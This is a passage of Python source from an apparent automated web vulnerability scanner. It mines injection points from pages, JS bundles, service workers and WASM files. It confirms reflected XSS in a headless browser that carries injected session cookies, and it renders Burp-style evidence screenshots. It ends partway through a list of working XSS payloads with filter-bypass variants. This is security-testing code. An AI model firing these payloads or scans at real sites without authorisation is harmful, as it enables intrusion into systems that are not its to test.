                _st, _bd, _ = await _get(session, u)
                return _st, _bd or ""

            _mres = await _pm.mine(_pm_fetch, base_url)
            _ip = _pm.to_input_point(base_url, _mres.get("discovered", []))
            if _ip:
                points.append(_ip)

            # 링크로 노출되지 않은 공통 반사 엔드포인트(게시판·검색·에코·프록시 등)를
            # 발굴한다. 페이지에서 링크를 못 찾으면 /vuln·/search 같은 반사점이 통째로
            # 누락되던 사각지대 보완. 200 text/html 인 엔드포인트만 마이닝(SAFE/GET).
            _known = {urllib.parse.urlparse(_p["url"]).path.rstrip("/") for _p in points}
            _mined_extra = 0
            for _ep in _REFLECT_ENDPOINTS:
                if _mined_extra >= 6:
                    break
                if _ep.rstrip("/") in _known:
                    continue
                _ep_url = base_url.rstrip("/") + _ep
                _est, _ebd, _ehd = await _get(session, _ep_url)
                # 200 + HTML 이면 마이닝(파라미터 없이는 본문이 비어도 무방 — 반사는 ?p= 로 확인).
                if _est != 200 or "text/html" not in _ehd.get("Content-Type", ""):
                    continue
                _emres = await _pm.mine(_pm_fetch, _ep_url)
                _eip = _pm.to_input_point(_ep_url, _emres.get("discovered", []))
                if _eip:
                    _eip["source"] = "reflect_endpoint"
                    points.append(_eip)
                    _mined_extra += 1

            # ── 인증영역 페이지 파라미터 마이닝 ──
            # 인증 크롤로 발견한 인증영역 페이지(get_auth_urls)도 파라미터를 마이닝한다. 인증 페이지의
            # 입력 폼 파라미터(name·q·search 등)가 링크/discovered_urls 로 안 잡혀 능동 점검에서 통째로
            # 누락되던 갭 보정(예: 반사형 XSS 입력폼). 대상 무관 범용(공통 파라미터명 + 폼 반사 확인).
            _auth_pages = get_auth_urls(scan_id) if scan_id else []
            if _auth_pages:
                _amined = 0
                _apaths = {urllib.parse.urlparse(_p["url"]).path.rstrip("/") for _p in points}
                for _au in _auth_pages:
                    if _amined >= 24:
                        break
                    if not _url_in_scope(_au, base_url):
                        continue
                    _apr = urllib.parse.urlparse(_au)
                    _apath = _apr.path.rstrip("/")
                    if _apath in _apaths:
                        continue
                    _apaths.add(_apath)
                    _aclean = f"{_apr.scheme}://{_apr.netloc}{_apr.path}"
                    _ast, _abd, _ahd = await _get(session, _aclean)
                    if _ast != 200 or "text/html" not in _ahd.get("Content-Type", ""):
                        continue
                    _amres = await _pm.mine(_pm_fetch, _aclean)
                    _aip = _pm.to_input_point(_aclean, _amres.get("discovered", []))
                    if _aip:
                        _aip["source"] = "auth_param_mining"
                        points.append(_aip)
                    _amined += 1

            # ── S5(safe 전용): 발견 엔드포인트까지 청크 파라미터 마이닝 확장 ──
            # 안전 스로틀이 설치된 safe 모드에서만 수행(요청은 5rps 캡·응답캐시 하에 나감). 청크 반사로
            # '요청 1건에 다수 파라미터'를 테스트해 요청당 커버리지를 극대화한다(숨은 파라미터=공격표면 확장).
            # 각 엔드포인트 워드리스트는 고가치 상위 N개(기본 96)로 제한해 젠틀함 유지.
            if discovered_urls and _response_cache.current() is not None:
                try:
                    _safe_mine_max = max(12, min(512, int(os.getenv("SAFE_MINE_MAX_PARAMS", "96"))))
                except (TypeError, ValueError):
                    _safe_mine_max = 96
                try:
                    import scan_depth as _sd5
                    _dmine_cap = max(4, min(80, int(round(12 * _sd5.scale()))))
                except Exception:
                    _dmine_cap = 12
                _mined_paths = {urllib.parse.urlparse(_p["url"]).path.rstrip("/") for _p in points}
                _dmine = 0
                for _du in discovered_urls:
                    if _dmine >= _dmine_cap:
                        break
                    if not _url_in_scope(_du, base_url):
                        continue
                    _dp = urllib.parse.urlparse(_du)
                    _dpath = _dp.path.rstrip("/")
                    if _dpath in _mined_paths:
                        continue
                    _mined_paths.add(_dpath)
                    _dclean = f"{_dp.scheme}://{_dp.netloc}{_dp.path}"
                    _dst, _dbd, _dhd = await _get(session, _dclean)   # S4 캐시로 재요청 시 무비용
                    if _dst != 200 or "text/html" not in _dhd.get("Content-Type", ""):
                        continue
                    _dmres = await _pm.mine(_pm_fetch, _dclean, max_params=_safe_mine_max)
                    _dip = _pm.to_input_point(_dclean, _dmres.get("discovered", []))
                    if _dip:
                        _dip["source"] = "param_mining_discovered"
                        points.append(_dip)
                    _dmine += 1
        except Exception:
            pass

    # ── JS 번들 API 엔드포인트 마이닝 (SPA/JS 앱 공격표면 확보 = API_SYNTHESIZED) ──
    # 정적 HTML 로는 표면이 거의 안 보이는 SPA(Angular/React)에서 실제 /api·/rest 엔드포인트를
    # JS 번들에서 뽑아 입력점으로 등록한다. (ENABLE_JS_ENDPOINT_MINING=false 로 비활성 가능)
    if body and os.getenv("ENABLE_JS_ENDPOINT_MINING", "true").lower() in ("1", "true", "yes"):
        try:
            import client_analysis as _ca
            _js_urls = _ca.same_origin_js_urls(body, base_url)
            _jsblob = _ca.inline_scripts(body)
            try:
                # SPA 는 라우트별 lazy 청크(각기 다른 API 엔드포인트 보유)를 다수 로드하므로 상향.
                _js_cap = max(1, min(40, int(os.getenv("MAX_JS_BUNDLES", "20"))))
            except (TypeError, ValueError):
                _js_cap = 20
            for _ju in _js_urls[:_js_cap]:
                try:
                    _, _jb, _ = await _get(session, _ju)
                    if _jb:
                        _jsblob += "\n" + _jb
                except ScanInterrupted:
                    raise
                except Exception:
                    pass
            # 구형 webpack: 청크가 HTML 미참조 → 런타임 청크맵에서 URL 재구성 후 추가 fetch.
            # (modulepreload 로 이미 잡힌 최신 빌드는 재구성 URL 이 중복→_get 중복만, 무해)
            if os.getenv("ENABLE_WEBPACK_CHUNK_MINING", "true").lower() in ("1", "true", "yes"):
                try:
                    _chunk_urls = _ca.mine_webpack_chunk_urls(_jsblob, base_url)
                    _fetched = {u for u in _js_urls[:_js_cap]}
                    for _cu in _chunk_urls[:_js_cap]:
                        if _cu in _fetched or not _url_in_scope(_cu, base_url):
                            continue
                        try:
                            _, _cb, _ = await _get(session, _cu)
                            if _cb:
                                _jsblob += "\n" + _cb
                        except ScanInterrupted:
                            raise
                        except Exception:
                            pass
                    if _chunk_urls:
                        print(f"[injection] webpack 런타임 청크맵에서 청크 {len(_chunk_urls)}개 재구성", flush=True)
                except ScanInterrupted:
                    raise
                except Exception:
                    pass
            # Service Worker / WASM: PWA·WASM 앱에만 있는 엔드포인트 표면 발견.
            # SW 스크립트(텍스트)·WASM(바이너리→문자열)을 _jsblob 에 합쳐 아래 mine 이 함께 추출.
            if os.getenv("ENABLE_SW_WASM_DISCOVERY", "true").lower() in ("1", "true", "yes"):
                try:
                    _sw_n = _wasm_n = 0
                    for _swu in _ca.service_worker_urls(body, _jsblob, base_url):
                        if not _url_in_scope(_swu, base_url):
                            continue
                        try:
                            _sc, _sb, _ = await _get(session, _swu)
                            # SPA 폴백이 index.html(200)을 돌려주는 경로가 많으므로 HTML 은 제외
                            # (실제 SW 는 JS/JSON). 이로써 가짜 SW 중복 수집·오탐 방지.
                            _head = (_sb or "")[:600].lower()
                            if _sc == 200 and _sb and "<html" not in _head and "<!doctype" not in _head:
                                _jsblob += "\n" + _sb          # SW 라우트 + precache url:"..." 추출
                                _sw_n += 1
                        except ScanInterrupted:
                            raise
                        except Exception:
                            pass
                    for _wu in _ca.wasm_urls(body, _jsblob, base_url):
                        if not _url_in_scope(_wu, base_url):
                            continue
                        try:
                            _raw = await _get_bytes(session, _wu)
                            # WASM 매직바이트(\x00asm) 확인 — SPA 폴백 HTML 을 바이너리로 오인 방지
                            if _raw[:4] == b"\x00asm":
                                _jsblob += "\n" + _ca.extract_wasm_strings(_raw)  # 데이터섹션 API 문자열
                                _wasm_n += 1
                        except ScanInterrupted:
                            raise
                        except Exception:
                            pass
                    if _sw_n or _wasm_n:
                        print(f"[injection] Service Worker {_sw_n}개 · WASM {_wasm_n}개 수집(추가 표면)", flush=True)
                except ScanInterrupted:
                    raise
                except Exception:
                    pass
            _seen_pt = {(p.get("method"), p.get("url"), tuple(sorted((p.get("params") or {})))) for p in points}
            _mined = 0
            # 파라미터 없는 마인 엔드포인트에 부여할 후보 주입 파라미터(주입 가능화).
            # SPA API 는 경로만 노출되는 경우가 많아, 공통 파라미터를 붙여 SQLi/XSS/IDOR 등이
            # 실제로 시험할 자리를 만든다. (설정: JS_ENDPOINT_DEFAULT_PARAMS, 비우면 부여 안 함)
            _dflt = os.getenv("JS_ENDPOINT_DEFAULT_PARAMS", "id,q")
            _dflt_params = {k.strip(): ("1" if k.strip() == "id" else "test")
                            for k in _dflt.split(",") if k.strip()}
            for _ep in _ca.mine_js_endpoints(_jsblob, base_url):
                if not _url_in_scope(_ep["url"], base_url):
                    continue
                if not _ep.get("params") and _dflt_params:
                    _ep["params"] = dict(_dflt_params)
                _k = (_ep["method"], _ep["url"], tuple(sorted(_ep["params"])))
                if _k in _seen_pt:
                    continue
                _seen_pt.add(_k)
                points.append(_ep)
                _mined += 1
            if _mined:
                print(f"[injection] JS 번들에서 API 엔드포인트 {_mined}개 발견(공격표면 확장)", flush=True)
        except ScanInterrupted:
            raise
        except Exception:
            pass

    # 범용 폴백
    points.append({
        "method": "GET", "url": base_url,
        "params": {"id": "1", "q": "test", "search": "test", "page": "1",
                   "file": "index", "name": "test", "url": "http://example.com",
                   "keyword": "test", "input": "test", "data": "test"},
        "source": "generic",
        "csrf_fields": [],
    })

    # JS 마이닝으로 입력점이 크게 늘 수 있어 내부 상한을 상향(최종 상한은 호출측 MAX_INJECTION_POINTS
    # + 공격표면 점수로 확정). 상한은 설정화(MAX_EXTRACTED_POINTS, 기본 120).
    try:
        _ep_cap = max(25, min(2000, int(os.getenv("MAX_EXTRACTED_POINTS", "120"))))
    except (TypeError, ValueError):
        _ep_cap = 120

    # 주입 유망 포인트를 앞으로(안정 정렬). SQLi/XSS 등 다수 프로브가 points[:8~12] 만 테스트하므로,
    # JS 마이닝으로 대량 발견된 일반 GET 표면이 실제 주입점(검색·인증·실파라미터 보유)을 뒤로 밀면
    # 영영 테스트되지 않는다. 정적 추출(form 등)·실파라미터·주입성 경로를 우선한다. (순서 보존=stable)
    _INJ_HINT_RE = re.compile(r'/(login|signin|auth|token|search|query|find|lookup|user|users|'
                              r'account|member|order|coupon|feedback|product|review|comment|'
                              r'report|admin|profile|payment|basket|cart|wallet)s?(/|\?|$)',
                              re.IGNORECASE)
    _DEFAULT_PARAM_SETS = ({"id", "q"}, set())

    def _inj_priority(p):
        src = p.get("source", "")
        prm = set((p.get("params") or {}).keys())
        u = p.get("url", "") or ""
        real_params = bool(prm) and prm not in _DEFAULT_PARAM_SETS
        # 0=정적/브라우저 추출(고신뢰), 1=실파라미터 보유, 2=주입성 경로, 3=그외
        if src not in ("js_endpoint", "generic"):
            return 0
        if real_params:
            return 1
        if _INJ_HINT_RE.search(u):
            return 2
        return 3

    points = sorted(points, key=_inj_priority)  # 파이썬 sort 는 안정적 → 동순위 원순서 보존
    return points[:_ep_cap]


# ── Playwright XSS 실제 발생 확인 ─────────────────────────────────────────────

async def _playwright_verify_xss(
    url: str, scan_id: str = "", timeout_ms: int = 8000, base_url: str = ""
) -> dict | None:
    """
    Playwright 헤드리스 브라우저로 URL에 접근하여 alert() 대화상자 발생 여부를 확인합니다.
    3단계 스크린샷:
      s1 — base_url 정상 접속 (공격 이전)
      xss_page — 페이로드 삽입 요청 후 응답 화면
      xss_alert — alert() 실제 발생 확인 화면
    """
    try:
        from playwright.async_api import async_playwright
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(
                headless=True,
                args=[
                    "--no-sandbox",
                    "--disable-setuid-sandbox",
                    "--disable-web-security",
                    "--disable-gpu",
                    "--ignore-certificate-errors",
                ],
            )
            ctx = await browser.new_context(
                ignore_https_errors=True,
                viewport={"width": 1280, "height": 800},
                user_agent=_SCANNER_UA,
            )
            # 인증 상태 확증: 등록된 로그인 세션 쿠키를 브라우저 컨텍스트에 주입한다.
            # (기존엔 비인증 컨텍스트라 인증 영역 XSS 확증 시 로그인으로 튕겨 alert 미발생 → 폐기됐음)
            try:
                _axc = get_auth_cookies(scan_id) if scan_id else []
                if _axc:
                    _cu = base_url or url
                    await ctx.add_cookies(
                        [{"name": c["name"], "value": c["value"], "url": _cu}
                         for c in _axc if c.get("name")])
            except Exception:
                pass
            page = await ctx.new_page()

            alert_data: dict = {"triggered": False, "message": ""}
            screenshots: list[str] = []
            dialog_shots: list[str] = []
            url_hash = hashlib.md5(url.encode()).hexdigest()[:8]

            async def _on_dialog(dialog):
                alert_data["triggered"] = True
                alert_data["message"] = dialog.message
                # alert() 팝업이 열린 상태에서 즉시 스크린샷 촬영 (닫기 전)
                if scan_id:
                    try:
                        fname_dlg = f"{scan_id}_xss_dialog_{url_hash}.png"
                        await page.screenshot(
                            path=str(_SCREENSHOTS_DIR / fname_dlg),
                            full_page=False,
                        )
                        dialog_shots.append(fname_dlg)
                    except Exception:
                        pass
                try:
                    await dialog.dismiss()
                except Exception:
                    pass

            page.on("dialog", _on_dialog)

            try:
                # ── Shot 1: '취약점이 발견된 그 페이지'의 공격 이전 정상 화면 ──────
                # (과거엔 base_url=루트를 찍어 'DVWA 첫화면'만 보이고 어느 페이지인지 알 수 없었음)
                if scan_id:
                    fname_s1 = f"{scan_id}_xss_s1_{url_hash}.png"
                    try:
                        await page.goto(url, wait_until="domcontentloaded", timeout=timeout_ms // 2)
                        await page.wait_for_timeout(300)
                        await page.evaluate(_OVERLAY_JS, [
                            f"【1단계】 점검 대상 페이지 최초 접속\nURL: {url[:100]}\n"
                            "↑ XSS 페이로드 삽입 이전 정상 화면",
                            "#1E3A5F", "left",
                        ])
                        await page.screenshot(path=str(_SCREENSHOTS_DIR / fname_s1), full_page=False)
                        screenshots.append(fname_s1)
                    except Exception:
                        pass

                # ── Shot 2: 페이로드 삽입 요청 후 응답 화면 ─────────────────
                await page.goto(url, wait_until="domcontentloaded", timeout=timeout_ms)
                if scan_id:
                    fname_page = f"{scan_id}_xss_page_{url_hash}.png"
                    try:
                        await page.evaluate(_OVERLAY_JS, [
                            f"【2단계】 XSS 페이로드 삽입 요청 전송\n"
                            f"URL: {url[:120]}\n"
                            "↑ <script>alert()...</script> 포함 요청 후 서버 응답 화면",
                            "#B45309", "left",
                        ])
                        await page.screenshot(
                            path=str(_SCREENSHOTS_DIR / fname_page),
                            full_page=False,
                        )
                        screenshots.append(fname_page)
                    except Exception:
                        pass

                await page.wait_for_timeout(2000)

                # ── Shot 3: alert() 발생 확인 배너 ──────────────────────────
                # dialog_shots: alert() 팝업 열린 상태 캡처 (이벤트 핸들러에서 촬영)
                screenshots.extend(dialog_shots)

                if alert_data["triggered"] and scan_id:
                    try:
                        await page.evaluate(
                            """(msg) => {
                                const b = document.createElement('div');
                                b.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);'
                                    +'background:#DC2626;color:#fff;padding:18px 36px;border-radius:8px;'
                                    +'font-size:15px;font-weight:bold;z-index:2147483647;'
                                    +'box-shadow:0 4px 24px rgba(0,0,0,.6);font-family:monospace;'
                                    +'text-align:center;max-width:860px;white-space:pre-wrap;';
                                b.textContent = '【3단계】 ★ XSS 취약점 실증 확인\\n'
                                    +'브라우저에서 alert("' + msg + '") 실제 발생\\n'
                                    +'→ JavaScript가 피해자 브라우저에서 실행됨';
                                document.body.appendChild(b);
                            }""",
                            alert_data["message"],
                        )
                        fname_alert = f"{scan_id}_xss_alert_{url_hash}.png"
                        await page.screenshot(
                            path=str(_SCREENSHOTS_DIR / fname_alert),
                            full_page=False,
                        )
                        screenshots.append(fname_alert)
                    except Exception:
                        pass

            except Exception:
                pass

            try:
                await ctx.close()
                await browser.close()
            except Exception:
                pass

            if alert_data["triggered"]:
                return {
                    "confirmed": True,
                    "alert_message": alert_data["message"],
                    "evidence_screenshots": screenshots,
                }

    except ImportError:
        pass
    except Exception:
        pass
    return None


async def _playwright_capture_burp_style(
    scan_id: str,
    label: str,
    method: str,
    req_url: str,
    req_headers: dict,
    req_body: str,
    resp_status: int,
    resp_headers: dict,
    resp_body: str,
    title: str = "",
) -> str | None:
    """
    Burp Suite Repeater 패널과 유사한 요청/응답 뷰를 HTML로 렌더링하여 스크린샷으로 저장합니다.
    취약점 재현에 필요한 정확한 요청과 서버 응답을 시각화합니다.
    """
    if not scan_id:
        return None

    def _esc(s: str) -> str:
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    req_hdr_str = "\n".join(f"{k}: {v}" for k, v in req_headers.items())
    req_text = f"{method} {req_url}\n{req_hdr_str}"
    if req_body:
        req_text += f"\n\n{req_body}"

    resp_hdr_str = "\n".join(f"{k}: {v}" for k, v in resp_headers.items())
    resp_text = f"HTTP/1.1 {resp_status}\n{resp_hdr_str}\n\n{resp_body[:2000]}"

    html = f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8">
<style>
  body {{ margin:0; background:#1e1e1e; font-family:monospace; font-size:12px; color:#d4d4d4; }}
  .title {{ background:#252526; color:#fff; padding:10px 16px; font-size:14px; font-weight:bold;
            border-bottom:2px solid #007acc; }}
  .panels {{ display:flex; height:calc(100vh - 40px); }}
  .panel {{ flex:1; display:flex; flex-direction:column; border-right:1px solid #3c3c3c; }}
  .panel-hdr {{ background:#2d2d30; color:#9cdcfe; padding:6px 12px; font-size:11px;
                font-weight:bold; border-bottom:1px solid #3c3c3c; letter-spacing:.5px; }}
  pre {{ flex:1; margin:0; padding:12px; overflow:auto; white-space:pre-wrap;
         word-break:break-all; line-height:1.5; background:#1e1e1e; }}
  .req {{ color:#ce9178; }}
  .resp {{ color:#4ec9b0; }}
  .highlight {{ background:#264f78; padding:2px 4px; border-radius:2px; color:#fff; }}
</style>
</head>
<body>
<div class="title">{'★ ' + _esc(title) if title else '보안 취약점 재현 — 요청/응답 증거'}</div>
<div class="panels">
  <div class="panel">
    <div class="panel-hdr">▶ REQUEST</div>
    <pre class="req">{_esc(req_text)}</pre>
  </div>
  <div class="panel">
    <div class="panel-hdr">◀ RESPONSE</div>
    <pre class="resp">{_esc(resp_text)}</pre>
  </div>
</div>
</body>
</html>"""

    try:
        from playwright.async_api import async_playwright
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-gpu"],
            )
            ctx = await browser.new_context(viewport={"width": 1400, "height": 700})
            page = await ctx.new_page()
            try:
                await page.set_content(html, wait_until="load")
                await page.wait_for_timeout(300)
                safe_label = re.sub(r"[^\w\-]", "_", label)[:28]
                filename = f"{scan_id}_burp_{safe_label}.png"
                await page.screenshot(path=str(_SCREENSHOTS_DIR / filename), full_page=False)
                return filename
            except Exception:
                return None
            finally:
                try:
                    await ctx.close()
                    await browser.close()
                except Exception:
                    pass
    except ImportError:
        return None
    except Exception:
        return None


async def _capture_devtools_network_shot(
    scan_id: str,
    label: str,
    target_url: str,
    highlight_texts: list[str] | None = None,
    vuln_title: str = "",
    post_data: dict | None = None,
    extra_headers: dict | None = None,
) -> str | None:
    """
    Chrome DevTools Network 탭 스타일 스크린샷을 생성합니다.

    1단계: Playwright로 실제 HTTP 요청을 전송하고 요청/응답 데이터를 인터셉트합니다.
    2단계: 인터셉트한 데이터를 Chrome DevTools Network 인스펙터 패널과 동일한
           레이아웃의 HTML로 렌더링하고 스크린샷으로 저장합니다.

    highlight_texts: 응답 바디에서 강조 표시할 문자열 목록 (취약점 증거 키워드)
    """
    if not scan_id:
        return None
    highlight_texts = highlight_texts or []

    captured: dict = {"req_url": "", "req_method": "", "req_headers": {}, "req_body": "",
                      "resp_status": 0, "resp_status_text": "", "resp_headers": {}, "resp_body": ""}

    try:
        from playwright.async_api import async_playwright

        async with async_playwright() as pw:
            browser = await pw.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-gpu",
                      "--ignore-certificate-errors"],
            )
            ctx = await browser.new_context(
                ignore_https_errors=True,
                viewport={"width": 1400, "height": 820},
                user_agent=_SCANNER_UA,
            )
            # 인증 세션 쿠키 주입 — 없으면 취약 대상(보호 페이지)이 로그인으로 튕겨
            # 증거 스크린샷/응답 캡처가 로그인창만 담김. 등록된 로그인 쿠키를 붙인다.
            try:
                _axc = get_auth_cookies(scan_id) if scan_id else []
                if _axc:
                    await ctx.add_cookies(
                        [{"name": c["name"], "value": c["value"], "url": target_url}
                         for c in _axc if c.get("name")])
            except Exception:
                pass
            page = await ctx.new_page()

            async def _on_req(request):
                if not captured["req_url"]:
                    captured["req_url"] = request.url
                    captured["req_method"] = request.method
                    captured["req_headers"] = dict(request.headers)
                    try:
                        captured["req_body"] = request.post_data or ""
                    except Exception:
                        pass

            async def _on_resp(response):
                if not captured["resp_status"]:
                    captured["resp_status"] = response.status
                    captured["resp_status_text"] = response.status_text
                    captured["resp_headers"] = dict(response.headers)
                    try:
                        captured["resp_body"] = await response.text()
                    except Exception:
                        captured["resp_body"] = "(응답 바디 로드 실패)"

            page.on("request", _on_req)
            page.on("response", _on_resp)

            try:
                nav_hdrs = {**_SCANNER_HEADERS, **(extra_headers or {})}
                if post_data:
                    await page.set_extra_http_headers(nav_hdrs)
                    await page.goto(target_url, wait_until="domcontentloaded", timeout=12000)
                else:
                    await page.set_extra_http_headers(nav_hdrs)
                    await page.goto(target_url, wait_until="domcontentloaded", timeout=12000)
                await page.wait_for_timeout(600)
            except Exception:
                pass

            await ctx.close()
            await browser.close()

        # ── DevTools Network 인스펙터 HTML 빌드 ───────────────────────────────
        def _esc(s: str) -> str:
            return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

        def _highlight(text: str, patterns: list[str]) -> str:
            escaped = _esc(text)
            for pat in patterns:
                if not pat:
                    continue
                ep = _esc(pat)
                escaped = escaped.replace(ep,
                    f'<mark style="background:#ff0;color:#000;padding:1px 3px;border-radius:2px;'
                    f'font-weight:bold;">{ep}</mark>')
            return escaped

        req_hdrs_html = "".join(
            f'<div style="padding:2px 0;border-bottom:1px solid #3a3a3a">'
            f'<span style="color:#9cdcfe">{_esc(k)}</span>: '
            f'<span style="color:#ce9178">{_esc(v)}</span></div>'
            for k, v in captured["req_headers"].items()
        )

        resp_hdrs_html = "".join(
            f'<div style="padding:2px 0;border-bottom:1px solid #3a3a3a">'
            f'<span style="color:#9cdcfe">{_esc(k)}</span>: '
            f'<span style="color:#4ec9b0">{_esc(v)}</span></div>'
            for k, v in captured["resp_headers"].items()
        )

        status_color = "#4ec9b0" if captured["resp_status"] < 400 else "#f44747"
        resp_body_display = _highlight(captured["resp_body"][:6000], highlight_texts)
        req_url_display = captured["req_url"] or target_url
        method = captured["req_method"] or ("POST" if post_data else "GET")

        html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8">
<style>
  * {{ box-sizing:border-box; margin:0; padding:0; }}
  body {{ background:#1e1e1e; font-family:'Consolas','Courier New',monospace; font-size:12px;
         color:#d4d4d4; height:100vh; display:flex; flex-direction:column; }}
  /* 상단 툴바 */
  .toolbar {{ background:#252526; border-bottom:1px solid #474747; padding:6px 12px;
              display:flex; align-items:center; gap:12px; flex-shrink:0; }}
  .tab {{ padding:4px 12px; cursor:pointer; border-radius:3px 3px 0 0; font-size:11px; }}
  .tab.active {{ background:#1e1e1e; border:1px solid #474747; border-bottom:none;
                 color:#fff; }}
  .tab:not(.active) {{ color:#858585; }}
  /* URL 바 */
  .urlbar {{ background:#0d0d0d; border:1px solid #474747; border-radius:3px;
             padding:3px 8px; font-size:11px; color:#569cd6; flex:1;
             white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }}
  .method-badge {{ background:#264f78; color:#9cdcfe; padding:2px 8px;
                   border-radius:3px; font-size:11px; font-weight:bold; }}
  .status-badge {{ padding:2px 8px; border-radius:3px; font-size:11px;
                   font-weight:bold; color:{status_color};
                   background:{'#1a3a1a' if captured['resp_status'] < 400 else '#3a1a1a'}; }}
  /* 패널 영역 */
  .panels {{ display:flex; flex:1; overflow:hidden; }}
  .panel {{ flex:1; display:flex; flex-direction:column; overflow:hidden;
            border-right:1px solid #3c3c3c; }}
  .panel-title {{ background:#2d2d30; padding:5px 12px; font-size:11px;
                  font-weight:bold; color:#858585; letter-spacing:.8px;
                  border-bottom:1px solid #474747; flex-shrink:0; text-transform:uppercase; }}
  .panel-body {{ flex:1; overflow-y:auto; padding:10px 12px; }}
  /* 섹션 헤더 */
  .section {{ font-size:11px; font-weight:bold; color:#858585; margin:10px 0 4px;
              text-transform:uppercase; letter-spacing:.5px; }}
  .section:first-child {{ margin-top:0; }}
  /* 취약점 배너 */
  .vuln-banner {{ background:#dc2626; color:#fff; padding:8px 14px; font-size:12px;
                  font-weight:bold; text-align:center; flex-shrink:0;
                  border-bottom:2px solid #fff; }}
  pre {{ white-space:pre-wrap; word-break:break-all; line-height:1.6; }}
</style>
</head>
<body>
{'<div class="vuln-banner">★ ' + _esc(vuln_title) + '</div>' if vuln_title else ''}
<div class="toolbar">
  <div class="tab active">Network</div>
  <div class="tab">Elements</div>
  <div class="tab">Console</div>
  <div class="tab">Sources</div>
  <span class="method-badge">{_esc(method)}</span>
  <div class="urlbar">{_esc(req_url_display)}</div>
  <span class="status-badge">{captured['resp_status']} {_esc(captured['resp_status_text'])}</span>
</div>
<div class="panels">
  <div class="panel">
    <div class="panel-title">&#9654; Request Headers</div>
    <div class="panel-body">
      <div class="section">General</div>
      <div style="padding:2px 0;border-bottom:1px solid #3a3a3a">
        <span style="color:#9cdcfe">Request URL</span>:
        <span style="color:#ce9178">{_esc(req_url_display)}</span></div>
      <div style="padding:2px 0;border-bottom:1px solid #3a3a3a">
        <span style="color:#9cdcfe">Request Method</span>:
        <span style="color:#4ec9b0">{_esc(method)}</span></div>
      <div style="padding:2px 0;border-bottom:1px solid #3a3a3a">
        <span style="color:#9cdcfe">Status Code</span>:
        <span style="color:{status_color}">{captured['resp_status']} {_esc(captured['resp_status_text'])}</span></div>
      <div class="section" style="margin-top:12px">Request Headers</div>
      {req_hdrs_html}
      {'<div class="section" style="margin-top:12px">Request Body (Form Data)</div><pre style="color:#ce9178">' + _esc(captured["req_body"]) + '</pre>' if captured["req_body"] else ''}
    </div>
  </div>
  <div class="panel">
    <div class="panel-title">&#9664; Response</div>
    <div class="panel-body">
      <div class="section">Response Headers</div>
      {resp_hdrs_html}
      <div class="section" style="margin-top:12px">Response Body</div>
      <pre>{resp_body_display}</pre>
    </div>
  </div>
</div>
</body></html>"""

        # HTML 페이지 렌더링 후 스크린샷
        async with async_playwright() as pw2:
            browser2 = await pw2.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-gpu"],
            )
            ctx2 = await browser2.new_context(viewport={"width": 1400, "height": 820})
            page2 = await ctx2.new_page()
            try:
                await page2.set_content(html, wait_until="load")
                await page2.wait_for_timeout(300)
                safe_label = re.sub(r"[^\w\-]", "_", label)[:28]
                filename = f"{scan_id}_devtools_{safe_label}.png"
                await page2.screenshot(path=str(_SCREENSHOTS_DIR / filename), full_page=False)
                return filename
            except Exception:
                return None
            finally:
                try:
                    await ctx2.close()
                    await browser2.close()
                except Exception:
                    pass

    except ImportError:
        return None
    except Exception:
        return None


# ── XS: 반사형 XSS ──────────────────────────────────────────────────────────────

# XSS 페이로드: alert() 실행으로 실제 발생 여부 확인
# document.domain을 포함해 대상 도메인에서 실행됨을 증명
_XSS_CONFIRM_MSG = "EOSEUREUM_XSS_PROBE"

_XSS_PAYLOADS = [
    f"<script>alert('{_XSS_CONFIRM_MSG}_'+document.domain)</script>",
    f'"><script>alert(\'{_XSS_CONFIRM_MSG}_\'+document.domain)</script>',
    f"'><script>alert('{_XSS_CONFIRM_MSG}_'+document.domain)</script>",
    f'<img src=x onerror="alert(\'{_XSS_CONFIRM_MSG}_\'+document.domain)">',
    f'"><img src=x onerror=alert(\'{_XSS_CONFIRM_MSG}_\'+document.domain)>',
    f"<svg onload=\"alert('{_XSS_CONFIRM_MSG}_'+document.domain)\">",
    f'"><svg onload=alert(\'{_XSS_CONFIRM_MSG}_\'+document.domain)>',
    f"<body onload=alert('{_XSS_CONFIRM_MSG}_'+document.domain)>",
    f"<details open ontoggle=alert('{_XSS_CONFIRM_MSG}_'+document.domain)>",
    f"<iframe src=\"javascript:alert('{_XSS_CONFIRM_MSG}_'+document.domain)\">",
    # 널 바이트 필터 우회 (webhacking.kr 기법)
    f"<scr\x00ipt>alert('{_XSS_CONFIRM_MSG}_'+document.domain)</scr\x00ipt>",
    f"<script\x00>alert('{_XSS_CONFIRM_MSG}_'+document.domain)</script>",
    f'<img src=x onerror\x00=alert(\'{_XSS_CONFIRM_MSG}_\'+document.domain)>',
    # 속성 컨텍스트 탈출
    f"' onmouseover=alert('{_XSS_CONFIRM_MSG}_'+document.domain) x='",
    f'" onfocus=alert(\'{_XSS_CONFIRM_MSG}_\'+document.domain) autofocus="',
    f"'><input autofocus onfocus=alert('{_XSS_CONFIRM_MSG}_'+document.domain)>",
    # 다양한 태그/이벤트
    f"<video><source onerror=alert('{_XSS_CONFIRM_MSG}_'+document.domain)>",
    f"<audio src=x onerror=alert('{_XSS_CONFIRM_MSG}_'+document.domain)>",
    f"<marquee onstart=alert('{_XSS_CONFIRM_MSG}_'+document.domain)>",
    f"<select autofocus onfocus=alert('{_XSS_CONFIRM_MSG}_'+document.domain)>",
    f"<textarea autofocus onfocus=alert('{_XSS_CONFIRM_MSG}_'+document.domain)>",
    f"<keygen autofocus onfocus=alert('{_XSS_CONFIRM_MSG}_'+document.domain)>",
    f"<math><mtext><script>alert('{_XSS_CONFIRM_MSG}_'+document.domain)</script>",
    # 대소문자/공백 우회
    f"<ScRiPt>alert('{_XSS_CONFIRM_MSG}_'+document.domain)</ScRiPt>",
    f"<img src=x onerror=\talert('{_XSS_CONFIRM_MSG}_'+document.domain)>",
    f"<svg><script>alert('{_XSS_CONFIRM_MSG}_'+document.domain)</script></svg>",
    # javascript: 스킴
